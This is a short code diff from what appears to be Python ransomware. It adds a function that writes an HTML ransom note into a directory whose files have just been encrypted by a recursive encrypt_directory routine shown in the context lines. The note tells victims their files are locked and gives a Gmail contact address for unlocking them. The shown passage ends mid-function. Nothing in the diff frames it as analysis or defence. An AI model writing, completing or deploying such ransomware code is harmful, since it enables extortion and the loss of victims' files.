@@ -68,5 +68,19 @@ def encrypt_directory(directory: str, password: str):
             file_path = os.path.join(root, file)
             encrypt_file(file_path, password)
         create_ransom_note_webpage(directory)
-        
+
 def create_ransom_note_webpage(directory: str):
+    """Create a ransom note webpage in the given directory."""
+    ransom_note_content = """
+    <html>
+    <head><title>Ransom Note</title></head>
+    <body>
+        <h1> All of your files have been encrypted.!</h1>
+        <p>To unlock them, contact me with your encryption code at sheilafana21@gmail.com.</p>
+        <p>Your encryption code is: {randomly_generated_code}</p>
+    </body>
+    </html>
+    """
+    # Generate a random encryption code (for demonstration purposes)
+       
+
